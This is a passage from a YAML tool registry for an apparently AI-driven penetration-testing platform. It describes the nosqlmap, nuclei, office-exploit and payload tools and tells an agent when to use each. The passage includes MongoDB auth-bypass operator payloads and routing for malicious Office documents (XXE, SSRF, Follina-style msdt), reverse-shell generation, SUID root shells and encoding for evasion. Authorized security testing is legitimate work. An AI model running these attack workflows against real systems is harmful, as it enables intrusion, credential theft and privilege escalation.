        when_to_use: Before setting up reverse shells, listeners, or any tool that needs LHOST (your IP address). The recommended_lhost
          value is the Docker container's IP on the engagement network — use this for reverse shell callbacks, netcat listeners,
          and Metasploit LHOST. Also useful for understanding the container's network connectivity.
        params: {}
        returns:
          interfaces:
            type: array
            description: 'Network interfaces, each with: name (e.g., ''eth0''), state (''UP''/''DOWN''), mac address, ipv4
              addresses array, ipv6 addresses array'
          recommended_lhost:
            type: string
            description: First non-loopback IPv4 address — recommended value for LHOST in reverse shells and listeners
  nosqlmap:
    name: nosqlmap
    version: '0.7'
    description: 'NoSQL injection testing and exploitation tool (native Python implementation, not the nosqlmap CLI). 3 methods:
      scan (quick test with 3 basic MongoDB operator payloads per URL parameter), inject (targeted injection with 16 built-in
      MongoDB payloads for auth bypass or data extraction), test_payloads (comprehensive test with 21 payloads including baseline
      comparison, response length differential, and status code change detection). Supports GET and POST with form or JSON
      content types. Uses httpx (async HTTP client) internally.'
    image: ghcr.io/silicon-works/mcp-tools-nosqlmap:latest
    image_size_mb: 180
    capabilities:
    - nosql_injection
    - mongodb_exploitation
    - database_enumeration
    - authentication_bypass
    routing:
      use_for:
      - test web form or API login for MongoDB NoSQL injection with operator payloads
      - bypass authentication on MongoDB-backed web app via $ne or $gt operator injection
      - test URL parameter for NoSQL injection with $regex $where $exists operators
      - NoSQL injection with JSON content type on REST API endpoints
      - parameter pollution style NoSQL injection with [$ne]= syntax
      never_use_for:
      - SQL injection (use sqlmap)
      - MySQL or PostgreSQL database access
      - direct MongoDB shell access (use mongodb tool)
      - port scanning
      triggers:
      - nosql injection
      - mongodb injection
      - nosqlmap
      - $ne
      - $gt
      - $regex
      - $where
      - operator injection
      - NoSQL auth bypass
      prefer_over: []
    phases:
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    methods:
      scan:
        description: 'Quick scan of a URL for NoSQL injection by testing each URL/POST parameter with 3 basic MongoDB operator
          payloads ({"$ne":""}, {"$gt":""}, [$ne]=test). Uses heuristic detection: HTTP 500 (server error processing injected
          operator) or HTTP 301/302 redirect on auth-related parameters (possible auth bypass). Parses parameters from URL
          query string and POST data.'
        when_to_use: First step when testing a web form or API endpoint backed by MongoDB/NoSQL. Provide the URL with query
          parameters for GET, or URL + data for POST. The tool auto-discovers all parameters and tests each one. Use this
          for initial detection — if it finds potential injection points, follow up with test_payloads for comprehensive confirmation
          with baseline comparison. Use cookie param for authenticated scans.
        params:
          url:
            type: string
            required: true
            description: Target URL to scan. For GET, include query parameters (e.g., 'http://target/search?q=test&category=1').
              For POST, the URL alone — provide POST data via 'data' param.
          method:
            type: string
            default: GET
            description: 'HTTP method: GET or POST.'
          data:
            type: string
            description: POST body in key=value&key2=value2 format (e.g., 'username=admin&password=test'). Parameters from
              both URL and data are tested.
          headers:
            type: object
            description: Custom HTTP headers as key-value pairs.
          cookie:
            type: string
            description: Cookie header value for authenticated testing (e.g., 'PHPSESSID=abc123; session=xyz'). Convenience
              param — alternatively use headers.
          database_type:
            type: string
            default: MongoDB
            description: 'Target database type: MongoDB, CouchDB, or Redis. Currently only affects output labeling — all payloads
              are MongoDB-focused.'
          timeout:
            type: integer
            default: 60
            description: Timeout in seconds per payload test.
        returns:
          vulnerabilities:
            type: array
            description: Payloads that triggered anomalous responses — each entry has parameter, payload, description, evidence.
          potential_injection_points:
            type: array
            description: Deduplicated list of parameter names that appeared injectable.
          parameters_found:
            type: array
            description: All parameters discovered in the request for testing.
      inject:
        description: 'Attempt NoSQL injection on a specific parameter with 16 built-in MongoDB payloads. Includes: operator
          injection ({"$ne":""}, {"$gt":""}, {"$regex":".*"}, {"$exists":true}), JavaScript injection ({"$where":"1==1"}),
          URL-encoded variants, double-encoded variants, and parameter pollution ([$ne]=, [$gt]=, [$regex]=.*). For auth_bypass,
          uses first 10 payloads focused on bypassing login. For extract_data, uses regex/where payloads.'
        when_to_use: 'After scan identifies a potentially injectable parameter, use inject to try the full payload set against
          that specific parameter. Choose injection_type=''auth_bypass'' for login forms (the most common NoSQL injection
          scenario — bypassing MongoDB authentication with {"$ne":""} on password field). Choose ''extract_data'' when you
          need to pull data via regex/where injection. Workflow: scan → inject(parameter=vulnerable_param) → if auth bypass
          succeeds, capture the authenticated session cookie.'
        params:
          url:
            type: string
            required: true
            description: Target URL (e.g., 'http://target/login').
          parameter:
            type: string
            required: true
            description: Parameter name to inject into (e.g., 'password', 'username'). Must match a parameter from the URL
              query string or POST data.
          method:
            type: string
            default: POST
            description: 'HTTP method: GET or POST.'
          data:
            type: string
            description: Base POST data in key=value&key2=value2 format (e.g., 'username=admin&password=test'). The specified
              parameter's value will be replaced with each injection payload.
          injection_type:
            type: string
            default: auth_bypass
            description: 'Injection strategy: ''auth_bypass'' (first 10 payloads, operator-focused), ''extract_data'' (regex/where
              payloads only), or ''blind'' (all 16 payloads).'
          headers:
            type: object
            description: Custom HTTP headers.
          cookie:
            type: string
            description: Cookie header value for authenticated testing (e.g., 'PHPSESSID=abc123').
          timeout:
            type: integer
            default: 60
            description: Timeout in seconds per payload test.
        returns:
          successful_payloads:
            type: array
            description: Payloads that triggered anomalous responses — each entry has payload, description, evidence, status_code.
          tests_performed:
            type: integer
            description: Number of payloads tested.
      test_payloads:
        description: 'Comprehensive NoSQL injection testing with 21 payloads (16 standard + 5 JSON-specific). First establishes
          a baseline response, then tests each payload and detects injection via three methods: (1) success_indicator string
          found in response, (2) response length differs by >100 bytes from baseline, (3) HTTP status code changes (200 or
          302 from non-200 baseline). Supports both form-urlencoded and JSON content types.'
        when_to_use: 'Most thorough NoSQL injection test — use when scan/inject gave inconclusive results, or when you need
          precise detection with baseline comparison. Supports JSON APIs via content_type=''json'' (automatically sets Content-Type:
          application/json and injects payloads into JSON body). Provide success_indicator (e.g., ''Welcome'', ''Dashboard'',
          ''logged in'') for reliable detection on login forms. Provide error_indicator (e.g., ''Invalid'', ''Error'') to
          filter out false positives from error pages with different content length.'
        params:
          url:
            type: string
            required: true
            description: Target URL (e.g., 'http://target/api/login').
          parameter:
            type: string
            required: true
            description: Parameter name to inject into (e.g., 'password').
          method:
            type: string
            default: POST
            description: 'HTTP method: GET or POST.'
          data:
            type: string
            description: 'Base request body. For form: ''username=admin&password=test''. For JSON: ''{"username":"admin","password":"test"}''.'
          content_type:
            type: string
            default: form
            description: 'Content type: ''form'' (application/x-www-form-urlencoded) or ''json'' (application/json). JSON
              mode injects payloads as JSON objects into the request body.'
          headers:
            type: object
            description: Custom HTTP headers.
          cookie:
            type: string
            description: Cookie header value for authenticated testing (e.g., 'PHPSESSID=abc123').
          success_indicator:
            type: string
            description: String in the response body that indicates successful injection (e.g., 'Welcome admin', 'Dashboard',
              'token'). More reliable than length-based detection.
          error_indicator:
            type: string
            description: String in the response body that indicates a failed attempt (e.g., 'Invalid credentials', 'Error').
              Used to filter out false positives from error pages.
          timeout:
            type: integer
            default: 120
            description: Timeout in seconds for the full test suite.
        returns:
          successful:
            type: array
            description: Payloads that differed from baseline — each entry has payload, description, evidence (array of reasons),
              response status and length.
          baseline:
            type: object
            description: Baseline response (status_code, response_length) for comparison.
          payloads_tested:
            type: integer
            description: Total number of payloads tested.
  nuclei:
    name: nuclei
    version: '3.0'
    description: Template-based vulnerability scanner (v3.7.0) with 12,000+ templates covering CVEs (3,800+), XSS (1,300+),
      misconfigurations (900+), RCE (900+), technology detection (810+), LFI (820+), SQLi (540+), default logins (300+), auth
      bypasses (250+), SSRF (180+), and more. Supports HTTP, DNS, SSL/TLS, TCP, and headless browser protocols. Templates
      are community-maintained by ProjectDiscovery and auto-updated.
    image: ghcr.io/silicon-works/mcp-tools-nuclei:latest
    image_size_mb: 500
    capabilities:
    - vulnerability_scanning
    - cve_detection
    - technology_detection
    - misconfiguration_detection
    routing:
      use_for:
      - vulnerability scanning and CVE detection
      - known CVE exploitation check with template matching
      - web application misconfiguration scanning
      - technology fingerprinting via nuclei templates
      - default credentials and exposed admin panel detection
      - SSL TLS certificate and cipher suite analysis
      - DNS misconfiguration zone takeover DKIM DMARC SPF check
      - remote code execution RCE detection
      - exposed sensitive files and information disclosure
      - SSRF blind XSS out-of-band vulnerability detection
      never_use_for:
      - port scanning
      - directory brute-forcing
      - password cracking
      triggers:
      - nuclei
      - CVE scan
      - vulnerability scan
      - template scan
      - security scan
      - misconfiguration scan
      prefer_over:
      - nikto
    phases:
    - enumeration
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 512
      cpu: 1.0
    methods:
      scan:
        description: Run nuclei templates against a target. By default runs all 12,000+ templates across HTTP, DNS, SSL, and
          TCP protocols. Use templates param to narrow to specific directories (http/cves/, http/vulnerabilities/, http/misconfiguration/,
          http/exposed-panels/, http/default-logins/, http/technologies/, http/exposures/, http/takeovers/, http/token-spray/,
          ssl/, dns/, network/) or tags param to filter by vulnerability type. Output is structured JSONL with template ID,
          name, severity, matched URL, extracted data, description, and references.
        when_to_use: 'After discovering services (from nmap) to systematically check for known CVEs, misconfigurations, exposed
          panels, default credentials, and information disclosure. This is the primary vulnerability scanning tool — run it
          after web-fingerprint identifies the technology stack. Use tags to focus on relevant vulnerability types: ''cve''
          for known CVEs against detected software versions, ''misconfig'' for server misconfigurations, ''default-login''
          for default credentials on admin panels, ''exposure'' for exposed sensitive files/endpoints. For SSL/TLS testing
          use templates=''ssl/'' to check for deprecated TLS, expired certs, weak ciphers, self-signed certificates. For DNS
          issues use templates=''dns/'' for zone takeover, DKIM/DMARC/SPF checks.'
        params:
          target:
            type: string
            required: true
            description: Target URL or IP (e.g., 'http://10.10.10.1', 'https://target.htb:8443', '10.10.10.1'). For non-HTTP
              protocols (dns, ssl, tcp) provide the hostname or IP.
          templates:
            type: string
            description: 'Template path or directory to run. Available directories: ''http/cves/'' (known CVEs), ''http/vulnerabilities/''
              (generic vulns), ''http/misconfiguration/'' (server misconfigs), ''http/exposed-panels/'' (admin panels), ''http/default-logins/''
              (default creds), ''http/technologies/'' (tech detection), ''http/exposures/'' (sensitive files/info), ''http/takeovers/''
              (subdomain takeover), ''http/token-spray/'' (API token testing), ''ssl/'' (TLS/cert issues), ''dns/'' (DNS misconfigs),
              ''network/'' (TCP service checks). Comma-separated for multiple.'
          tags:
            type: string
            description: 'Filter templates by tags (comma-separated). Common tags with template counts: ''cve'' (~3,800),
              ''xss'' (~1,300), ''exposure'' (~1,300), ''misconfig'' (~900), ''rce'' (~900), ''tech'' (~810), ''lfi'' (~820),
              ''sqli'' (~540), ''default-login'' (~300), ''auth-bypass'' (~250), ''token'' (~230), ''ssrf'' (~180). Combine:
              ''cve,rce'' for CVEs and RCE only.'
          severity:
            type: string
            description: 'Filter by severity level (comma-separated). Values: ''info'', ''low'', ''medium'', ''high'', ''critical'',
              ''unknown''. Use ''critical,high'' for quick high-impact-only scan. Use ''critical,high,medium'' for a balanced
              scan.'
          rate_limit:
            type: integer
            default: 150
            description: Maximum requests per second. Reduce to 50-100 for stealthier scanning or if target rate-limits. Increase
              to 300+ for faster scanning on robust targets.
          follow_redirects:
            type: boolean
            default: true
            description: Follow HTTP redirects (nuclei -fr flag). Enable for targets that redirect HTTP→HTTPS or / → /login.
              Disable when you want to scan the exact URL without following redirects.
          headers:
            type: string
            description: Custom headers in 'Header:Value' format, comma-separated for multiple (e.g., 'Authorization:Bearer
              token123,Cookie:session=abc'). Essential for authenticated scanning behind login pages or WAFs.
          proxy:
            type: string
            description: HTTP/SOCKS5 proxy URL (e.g., 'socks5://127.0.0.1:1080', 'http://127.0.0.1:8080'). Use with tunnel
              MCP server for scanning internal targets via SSH tunnel.
          exclude_tags:
            type: string
            description: Tags to exclude from scan (comma-separated, e.g., 'dos,fuzz' to skip denial-of-service and fuzzing
              templates). Useful for avoiding noisy or destructive templates.
          timeout:
            type: integer
            default: 600
            description: Total scan timeout in seconds (default 10 minutes). A full scan with all templates can take 5-15
              minutes. Increase to 1800 (30min) for thorough scans. Decrease to 120-300 for focused scans with specific tags/templates.
        returns:
          findings:
            type: array
            description: 'Detected vulnerabilities, each with: template_id, name, severity (info/low/medium/high/critical),
              type (http/dns/ssl/tcp), host, matched_at (exact URL), extracted (extracted data like versions/tokens), description,
              reference (CVE/advisory URLs), tags'
          by_severity:
            type: object
            description: 'Finding counts grouped by severity level (e.g., {critical: 1, high: 3, medium: 5, low: 2, info:
              10})'
          total_findings:
            type: integer
            description: Total number of findings across all severities
      quick_scan:
        description: Fast scan focusing on critical and high severity vulnerabilities only, filtered by a specific vulnerability
          focus area. Uses higher rate limit (200 rps) and only runs templates tagged with the focus area AND severity critical/high.
          Much faster than a full scan — typically completes in 1-3 minutes.
        when_to_use: 'For rapid initial assessment when you want to quickly check for high-impact vulnerabilities without
          waiting for a full scan. Run this first to find quick wins, then follow up with a full scan if needed. Focus areas:
          ''cve'' for known CVEs with public exploits, ''rce'' for remote code execution, ''sqli'' for SQL injection, ''xss''
          for cross-site scripting, ''lfi'' for local file inclusion, ''ssrf'' for server-side request forgery, ''auth-bypass''
          for authentication bypass, ''default-login'' for default credentials on admin panels.'
        params:
          target:
            type: string
            required: true
            description: Target URL or IP (e.g., 'http://10.10.10.1', 'https://target.htb')
          focus:
            type: string
            enum:
            - cve
            - rce
            - lfi
            - sqli
            - xss
            - ssrf
            - auth-bypass
            - default-login
            default: cve
            description: 'Vulnerability type to focus on. Maps to nuclei tags: ''cve'' (~3,800 templates, known CVEs), ''rce''
              (~900, remote code execution), ''lfi'' (~820, local file inclusion), ''sqli'' (~540, SQL injection), ''xss''
              (~1,300, cross-site scripting), ''ssrf'' (~180, server-side request forgery), ''auth-bypass'' (~250, authentication
              bypass), ''default-login'' (~300, default credentials)'
          follow_redirects:
            type: boolean
            default: true
            description: Follow HTTP redirects
          headers:
            type: string
            description: Custom headers in 'Header:Value' format, comma-separated
          proxy:
            type: string
            description: HTTP/SOCKS5 proxy URL
          timeout:
            type: integer
            default: 300
            description: Scan timeout in seconds. Nuclei has ~60-90s startup overhead; quick scans typically complete in 2-4
              minutes total.
        returns:
          findings:
            type: array
            description: Critical and high severity findings matching the focus area, each with template_id, name, severity,
              matched_at URL, extracted data, description, and references
          total_findings:
            type: integer
            description: Number of critical/high findings found
      tech_detect:
        description: Fast technology detection using nuclei's ~810 'tech' tagged templates. Identifies web technologies, frameworks,
          CMS platforms, server software, and infrastructure components. Uses the same template engine as vulnerability scanning
          but only runs detection templates — no exploitation or active testing. Faster than a full scan but slower than web-fingerprint's
          signature matching.
        when_to_use: 'For technology fingerprinting when web-fingerprint''s 25 built-in signatures aren''t sufficient. Nuclei''s
          tech templates cover hundreds more technologies via community-maintained templates. However, web-fingerprint is
          faster for common technologies (WordPress, Laravel, nginx, etc.) and should be tried first. Use tech_detect when:
          web-fingerprint didn''t identify the technology, you need more specific version detection, or you want to detect
          niche/uncommon technologies.'
        params:
          target:
            type: string
            required: true
            description: Target URL or IP (e.g., 'http://10.10.10.1', 'https://target.htb')
          timeout:
            type: integer
            default: 300
            description: Scan timeout in seconds. Nuclei has ~60s startup overhead for template loading; ~810 tech templates
              need 2-3 minutes total.
        returns:
          technologies:
            type: array
            description: List of detected technology names (deduplicated)
          details:
            type: array
            description: Full detection details for each technology, including template_id, name, matched_at URL, extracted
              version information, and tags
      auto_scan:
        description: Automatic vulnerability scan using Wappalyzer-based technology detection to select only relevant templates.
          Nuclei detects the target's technology stack (CMS, framework, server, etc.) and runs matching templates instead
          of all 12,000+. Much faster and more targeted than a full scan while still covering known CVEs and misconfigurations
          for the detected stack.
        when_to_use: 'After discovering a web service, as a smart alternative to a full scan. Auto-scan is ideal when you
          don''t know what technology the target runs — it detects the stack first, then scans for relevant vulnerabilities.
          Faster than a full scan because it only runs matching templates. Use this when: you want a targeted scan without
          manually specifying tags/templates, web-fingerprint identified the technology but you want vulnerability scanning
          focused on that stack, or you want a good balance between speed and coverage.'
        params:
          target:
            type: string
            required: true
            description: Target URL (e.g., 'http://10.10.10.1', 'https://target.htb')
          severity:
            type: string
            description: Filter by severity (info,low,medium,high,critical). Use 'critical,high' for fast high-impact-only
              results.
          rate_limit:
            type: integer
            default: 150
            description: Maximum requests per second
          follow_redirects:
            type: boolean
            default: true
            description: Follow HTTP redirects
          headers:
            type: string
            description: Custom headers in 'Header:Value' format, comma-separated
          timeout:
            type: integer
            default: 600
            description: Timeout in seconds
        returns:
          findings:
            type: array
            description: Detected vulnerabilities matching the auto-detected technology stack
          by_severity:
            type: object
            description: Finding counts grouped by severity level
          total_findings:
            type: integer
            description: Total number of findings
      dast_scan:
        description: 'Dynamic application security testing (DAST) using nuclei''s built-in fuzzer engine. Fuzzes HTTP parameters
          (query, body, headers, cookies) with injection payloads to discover vulnerabilities like SQLi, XSS, SSRF, command
          injection, and more. Aggression level controls payload count: low uses fewer payloads for faster scanning, high
          uses comprehensive payload sets for thorough testing.'
        when_to_use: 'After initial reconnaissance and vulnerability scanning to actively test for injection vulnerabilities
          that template-based scanning can''t find. DAST/fuzzing is more aggressive than template scanning — it sends actual
          attack payloads to parameters. Use this when: template scans found no vulnerabilities but the target has input parameters,
          you want to test for SQLi/XSS/command injection on specific endpoints, or you want to complement template-based
          scanning with active fuzzing. Use a lower rate_limit (50-100) to avoid overwhelming the target.'
        params:
          target:
            type: string
            required: true
            description: Target URL to fuzz (e.g., 'http://target.htb/search?q=test'). Include parameters for targeted fuzzing.
          aggression:
            type: string
            enum:
            - low
            - medium
            - high
            default: low
            description: Fuzzing aggression level controlling payload count. low=fewer payloads (faster, less noise), medium=balanced,
              high=comprehensive payload sets (slower, thorough). Start with low and escalate if needed.
          headers:
            type: string
            description: Custom headers in 'Header:Value' format, comma-separated. Use for authenticated fuzzing.
          follow_redirects:
            type: boolean
            default: true
            description: Follow HTTP redirects
          proxy:
            type: string
            description: HTTP/SOCKS5 proxy URL
          rate_limit:
            type: integer
            default: 100
            description: Maximum requests per second (lower default for fuzzing to avoid overwhelming targets)
          timeout:
            type: integer
            default: 600
            description: Timeout in seconds
        returns:
          findings:
            type: array
            description: Fuzzing findings with template_id, name, severity, matched_at URL, extracted data, and vulnerability
              details
          total_findings:
            type: integer
            description: Total number of findings from fuzzing
  office-exploit:
    name: office-exploit
    version: '1.0'
    description: 'Create malicious Microsoft Office documents (XLSX, DOCX, PPTX) with embedded XSS, XXE, SSRF, formula injection,
      and template injection payloads for authorized security testing. 6 methods: create_xlsx (XSS via sheet names, XXE in
      6 XML targets, formula injection, external links for SSRF), create_docx (XXE, external image SSRF, Follina-style template
      injection), create_pptx (XXE, external media SSRF, hover/click action links), modify_office_xml (low-level XML editing
      via xpath), extract_office_xml (inspect XML internals), list_payloads (show available templates). All outputs include
      base64-encoded file content for immediate delivery. No macros (use metasploit for VBA macro payloads).'
    image: ghcr.io/silicon-works/mcp-tools-office-exploit:latest
    image_size_mb: 80
    capabilities:
    - malicious_document_generation
    - xxe_injection
    - xss_injection
    - ssrf_exploitation
    - formula_injection
    - template_injection
    see_also:
    - curl
    - metasploit
    routing:
      use_for:
      - create malicious Excel XLSX with XSS payload in sheet names for PHPSpreadsheet CVE-2025-22131
      - create malicious Word DOCX with XXE payload to read server files or trigger SSRF
      - create malicious PowerPoint PPTX with hover or click action link for code execution
      - XXE injection via crafted Office document uploaded to web application
      - SSRF via external image or link reference in Office document
      - formula injection in Excel spreadsheet for CSV injection or data exfiltration
      - Follina-style template injection in DOCX via ms-msdt protocol handler
      - extract and inspect XML internals of Office documents for custom payload crafting
      never_use_for:
      - legitimate document creation
      - document conversion
      - reading Office files
      - macro generation
      triggers:
      - malicious xlsx
      - malicious docx
      - malicious pptx
      - xxe payload
      - xss spreadsheet
      - office exploit
      - formula injection
      prefer_over: []
    warnings:
    - Generated documents are for authorized security testing ONLY
    - Macro payloads (XLSM/DOCM) not supported in v1 - use metasploit instead
    - Output files must be within /session/ directory
    phases:
    - exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.25
    methods:
      create_xlsx:
        description: Create a malicious Excel file with XSS, XXE, formula injection, or external link payloads
        when_to_use: When you need to exploit web applications that process XLSX files (PHPSpreadsheet, Apache POI, etc.)
        params:
          output_path:
            type: string
            required: true
            description: Path to save the file (must be within /session/)
          sheets:
            type: array
            required: true
            description: 'Array of sheet definitions: [{name: string, data?: string[][]}]. Sheet names are NOT sanitized.'
          payload_type:
            type: enum
            values:
            - xss_sheetname
            - xxe
            - formula
            - external_link
            description: Type of payload to inject
          xxe_style:
            type: enum
            values:
            - oob_http
            - oob_ftp
            - file_read
            - ssrf
            default: oob_http
            description: XXE injection style
          xxe_target_xml:
            type: enum
            values:
            - sharedStrings
            - workbook
            - sheet1
            - styles
            - contentTypes
            - multi
            default: sharedStrings
            description: XML file to inject XXE into
          xxe_callback_url:
            type: string
            description: Callback URL for OOB XXE
          xxe_file_to_read:
            type: string
            description: File path for file_read XXE
          formula:
            type: string
            description: Formula to inject in cell A1 (shortcut)
          external_link_type:
            type: enum
            values:
            - workbook_ref
            - web_query
            default: workbook_ref
            description: Type of external link for SSRF
          external_url:
            type: string
            description: External URL for SSRF payloads
        returns:
          path:
            type: string
            description: Path to generated file
          size_bytes:
            type: integer
            description: File size in bytes
          sha256:
            type: string
            description: SHA256 hash of file
          payload_type:
            type: string
            description: Type of payload injected
          injection_locations:
            type: array
            description: XML files modified
          content_base64:
            type: string
            description: Base64-encoded file content for immediate use
      create_docx:
        description: Create a malicious Word file with XXE, external image, or template injection payloads
        when_to_use: When you need to exploit applications that process DOCX files or need SSRF via document
        params:
          output_path:
            type: string
            required: true
            description: Path to save the file (must be within /session/)
          content:
            type: string
            description: Document text content
          payload_type:
            type: enum
            values:
            - xxe
            - external_image
            - template_injection
            description: Type of payload to inject
          xxe_style:
            type: enum
            values:
            - oob_http
            - oob_ftp
            - file_read
            - ssrf
            default: oob_http
            description: XXE injection style
          xxe_target_xml:
            type: enum
            values:
            - document
            - settings
            - styles
            - fontTable
            - webSettings
            - multi
            default: document
            description: XML file to inject XXE into
          xxe_callback_url:
            type: string
            description: Callback URL for OOB XXE
          xxe_file_to_read:
            type: string
            description: File path for file_read XXE
          external_url:
            type: string
            description: External URL for image/template SSRF
          template_type:
            type: enum
            values:
            - remote
            - msdt
            default: remote
            description: Template injection type (msdt = Follina-style)
          template_url:
            type: string
            description: URL for remote template
        returns:
          path:
            type: string
            description: Path to generated file
          size_bytes:
            type: integer
            description: File size in bytes
          sha256:
            type: string
            description: SHA256 hash of file
          payload_type:
            type: string
            description: Type of payload injected
          injection_locations:
            type: array
            description: XML files modified
          content_base64:
            type: string
            description: Base64-encoded file content
      create_pptx:
        description: Create a malicious PowerPoint file with XXE, external media, or action link payloads
        when_to_use: When you need to exploit applications that process PPTX files or need hover/click-triggered attacks
        params:
          output_path:
            type: string
            required: true
            description: Path to save the file (must be within /session/)
          payload_type:
            type: enum
            values:
            - xxe
            - external_media
            - action_link
            description: Type of payload to inject
          xxe_style:
            type: enum
            values:
            - oob_http
            - oob_ftp
            - file_read
            - ssrf
            default: oob_http
            description: XXE injection style
          xxe_target_xml:
            type: enum
            values:
            - presentation
            - slide1
            - slideLayout
            - slideMaster
            - multi
            default: presentation
            description: XML file to inject XXE into
          xxe_callback_url:
            type: string
            description: Callback URL for OOB XXE
          xxe_file_to_read:
            type: string
            description: File path for file_read XXE
          external_url:
            type: string
            description: External URL for media SSRF
          trigger:
            type: enum
            values:
            - hover
            - click
            default: hover
            description: Action link trigger
          action:
            type: enum
            values:
            - hyperlink
            - program
            default: hyperlink
            description: Action type
          action_target:
            type: string
            description: Target URL or program path
        returns:
          path:
            type: string
            description: Path to generated file
          size_bytes:
            type: integer
            description: File size in bytes
          sha256:
            type: string
            description: SHA256 hash of file
          payload_type:
            type: string
            description: Type of payload injected
          injection_locations:
            type: array
            description: XML files modified
          content_base64:
            type: string
            description: Base64-encoded file content
      modify_office_xml:
        description: Low-level XML manipulation for custom payloads not covered by create_* methods
        when_to_use: When pre-built payloads don't fit your needs and you need fine-grained control over Office XML
        params:
          input_path:
            type: string
            required: true
            description: Path to existing Office file
          output_path:
            type: string
            required: true
            description: Path to save modified file
          xml_file:
            type: string
            required: true
            description: XML file within archive (e.g., 'xl/workbook.xml')
          modifications:
            type: array
            required: true
            description: 'Array of modifications: [{xpath, action, content}]'
        returns:
          path:
            type: string
            description: Path to modified file
          size_bytes:
            type: integer
            description: File size in bytes
          sha256:
            type: string
            description: SHA256 hash of file
          injection_locations:
            type: array
            description: XML files modified
          content_base64:
            type: string
            description: Base64-encoded file content
      extract_office_xml:
        description: Extract and inspect XML files from Office documents
        when_to_use: To analyze existing Office files before crafting custom payloads
        params:
          input_path:
            type: string
            required: true
            description: Path to Office file
          xml_file:
            type: string
            description: Specific XML file to extract (omit to list all files)
        returns:
          file:
            type: string
            description: Extracted file path (when xml_file specified)
          content:
            type: string
            description: XML content (when xml_file specified)
          files:
            type: array
            description: List of files in archive (when xml_file omitted)
      list_payloads:
        description: List available payload templates and examples
        when_to_use: To discover what payload types are available before generating documents
        params:
          file_type:
            type: enum
            values:
            - xlsx
            - docx
            - pptx
            description: Filter by file type
          category:
            type: enum
            values:
            - xss
            - xxe
            - ssrf
            - formula
            description: Filter by attack category
        returns:
          payloads:
            type: object
            description: Available payloads organized by file type and category
  payload:
    name: payload
    version: '1.0'
    description: 'Payload compiler and generator for reverse shells, SUID binaries, C compilation, and encoding. 6 methods:
      compile_c (GCC cross-compilation for x64/x86/ARM, static/stripped), suid_shell (setuid(0)+execve shell binary), revshell
      (one-liners in 8 languages: bash, python, nc, php, perl, ruby, powershell, socat with variants), list_shells (show all
      available reverse shell types), encode (base64/URL/double-URL/hex/unicode), decode. Does NOT require network — runs
      locally. For Metasploit msfvenom payloads, use metasploit generate_payload instead.'
    image: ghcr.io/silicon-works/mcp-tools-payload:latest
    image_size_mb: 400
    capabilities:
    - binary_compilation
    - reverse_shell_generation
    - payload_encoding
    - suid_binary_creation
    phases:
    - exploitation
    - post-exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 512
      cpu: 1.0
    routing:
      use_for:
      - generate reverse shell one-liners in bash python php perl ruby powershell
      - compile C exploit source code to ELF binary
      - create SUID shell binary for privilege escalation
      - encode payloads in base64 URL hex or unicode for delivery
      - cross-compile C code for x86 ARM or x64 targets
      never_use_for:
      - vulnerability scanning
      - port scanning
      - brute-force attacks
      triggers:
      - reverse shell
      - payload
      - compile
      - encode payload
      - SUID binary
      - shellcode
      - revshell
    methods:
      compile_c:
        description: Compile C source code to an ELF binary using GCC. Supports x64, x86, and ARM architectures. Options for
          static linking (for targets without shared libraries) and symbol stripping (smaller binary, harder to reverse).
          Returns the compiled binary as base64 or hex.
        when_to_use: 'To compile kernel exploits, privilege escalation exploits, or custom C code for a target. Typical workflow:
          get exploit source from searchsploit → compile_c with static=true for portability → upload to target via ssh upload_binary
          → execute. Use arch=''x86'' for 32-bit targets, ''arm'' for embedded/IoT.'
        params:
          source:
            type: string
            required: true
            description: C source code to compile
          arch:
            type: enum
            values:
            - x64
            - x86
            - arm
            default: x64
            description: Target architecture
          static:
            type: boolean
            default: false
            description: Compile statically linked binary
          strip:
            type: boolean
            default: true
            description: Strip symbols from binary
          output_format:
            type: enum
            values:
            - base64
            - hex
            default: base64
            description: Output encoding format
        returns:
          binary:
            type: string
            description: Compiled binary in specified format
          size_bytes:
            type: integer
            description: Binary size in bytes
      suid_shell:
        description: Generate a SUID shell binary
        when_to_use: To create a binary that runs commands as root when SUID is set
        params:
          command:
            type: string
            default: /bin/bash
            description: Command to execute
          arch:
            type: enum
            values:
            - x64
            - x86
            default: x64
            description: Target architecture
          output_format:
            type: enum
            values:
            - base64
            - hex
            default: base64
            description: Output encoding format
        returns:
          binary:
            type: string
            description: SUID shell binary in specified format
          size_bytes:
            type: integer
            description: Binary size in bytes
      revshell:
        description: 'Generate a reverse shell one-liner in 8 languages: bash (tcp/pty/mkfifo variants), python, nc (traditional/mkfifo),
          php, perl, ruby, powershell, socat. Supports encoding (base64, URL, double-URL) for delivery through injection points.'
        when_to_use: 'When you have RCE and need a reverse shell payload in a specific language available on the target. Choose
          based on what''s installed: bash (most Linux), python (if Python installed), php (PHP web servers), powershell (Windows).
          Use encode=base64 to avoid special character issues in injection. Start a listener (netcat listen or metasploit
          handler) BEFORE delivering the payload.'
        params:
          lhost:
            type: string
            required: true
            description: Listener IP address
          lport:
            type: integer
            required: true
            description: Listener port
          type:
            type: enum
            values:
            - bash
            - python
            - nc
            - php
            - perl
            - ruby
            - powershell
            - socat
            default: bash
            description: Reverse shell type
          variant:
            type: string
            description: Variant of the shell type (e.g., 'tcp', 'pty', 'mkfifo')
          encode:
            type: enum
            values:
            - none
            - base64
            - url
            - double-url
            default: none
            description: Encoding to apply
        returns:
          payload:
            type: string
            description: Reverse shell payload
          raw_payload:
            type: string
            description: Unencoded payload (if encoding applied)
      list_shells:
        description: List available reverse shell types and variants
        when_to_use: To see available reverse shell options
        params: {}
        returns:
          shells:
            type: object
            description: Available shell types and their variants
      encode:
        description: Encode a payload
        when_to_use: To encode payloads for evasion or transport
        params:
          payload:
            type: string
            required: true
            description: Payload to encode
          encoding:
            type: enum
            values:
            - base64
            - url
            - double-url
            - hex
            - unicode
            required: true
            description: Encoding method
        returns:
          encoded:
            type: string
            description: Encoded payload
      decode:
        description: Decode an encoded payload
        when_to_use: To decode payloads for analysis
        params:
          payload:
            type: string
            required: true
            description: Payload to decode
          encoding:
            type: enum
            values:
            - base64
            - url
            - hex
            required: true
            description: Encoding to reverse
        returns:
          decoded:
            type: string
            description: Decoded payload
  playwright-mcp:
    name: playwright-mcp
    version: latest
    description: 'Browser automation via Microsoft @playwright/mcp for complex web interactions, JavaScript-rendered pages,
